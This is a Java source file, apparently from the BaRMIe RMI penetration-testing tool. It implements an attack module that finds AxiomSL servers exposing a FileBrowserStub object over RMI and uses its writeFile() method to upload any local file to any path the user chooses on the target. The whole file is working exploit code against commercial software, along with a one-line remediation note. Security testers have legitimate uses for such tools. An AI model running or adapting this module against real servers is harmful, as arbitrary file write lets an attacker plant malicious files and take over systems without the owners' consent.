package nb.barmie.modes.attack.attacks.Axiom;

import axiomsl.server.rmi.FileBrowserStub;
import axiomsl.server.rmi.FileInformation;
import java.io.File;
import java.io.FileInputStream;
import nb.barmie.exceptions.BaRMIeAttackException;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.exceptions.BaRMIeRemoteMethodCallException;
import nb.barmie.modes.attack.RMIAttack;
import nb.barmie.modes.enumeration.RMIEndpoint;

/***********************************************************
 * Write a fie to a server running AxiomSL.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class WriteFile extends RMIAttack {
	/*******************
	 * Set attack properties
	 ******************/
	public WriteFile() {
		super();
		this.setDescription("AxiomSL arbitrary file write");
		this.setDetailedDescription("AxiomSL exposes an object FileBrowserStub, which has a writeFile() method that writes the given data to the given path.");
		this.setRemediationAdvice("[AxiomSL] Update AxiomSL to the latest available version.");
	}
	
	/*******************
	 * Check if the given endpoint can be attacked.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 * @return True if we can attack it.
	 ******************/
	public boolean canAttackEndpoint(RMIEndpoint ep) {
		return ep.hasClass("axiomsl.server.rmi.FileBrowserStub");
	}
	
	/*******************
	 * Attack the endpoint.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 ******************/
	public void executeAttack(RMIEndpoint ep) throws BaRMIeException {
		FileInputStream fis;
		FileBrowserStub fbs;
		FileInformation fi;
		String srcFilename;
		String dstFilename;
		byte[] contents;
		
		//Ask the user for a filename to upload
		srcFilename = this.promptUserForInput("Enter a local file to upload: ", false);
		
		//Ask the user for a destination filename
		dstFilename = this.promptUserForInput("Enter a remote path to save the file to: ", false);
		System.out.println("");
		
		//Get the fileBrowser object from the endpoint
		System.out.println("[~] Getting fileBrowser object...");
		fbs = (FileBrowserStub)this.getRemoteObject(ep, "fileBrowser");
		
		//Read the contents of the local file
		try {
			fis = new FileInputStream(srcFilename);
			contents = new byte[(int)new File(srcFilename).length()];
			fis.read(contents, 0, contents.length);
			fis.close();
		} catch(Exception ex) {
			throw new BaRMIeAttackException("Unable to read the given local file ('" + srcFilename + "').", ex);
		}
		
		//Attempt to write the file to the server
		try {
			System.out.println("[+] Retrieved, attempting to write remote file...");
			fbs.writeFile(dstFilename, contents);
			fi = fbs.getFileInformation(dstFilename);
			if(fi.bExists == true) {
				System.out.println("[+] The file appears to have been written successfully.");
			} else {
				System.out.println("[-] Failed to write the file to the server.");
			}
		} catch(Exception re) {
			//Failed to write the file to the target
			throw new BaRMIeRemoteMethodCallException("Failed to write the file to the server.", re);
		}
	}
}
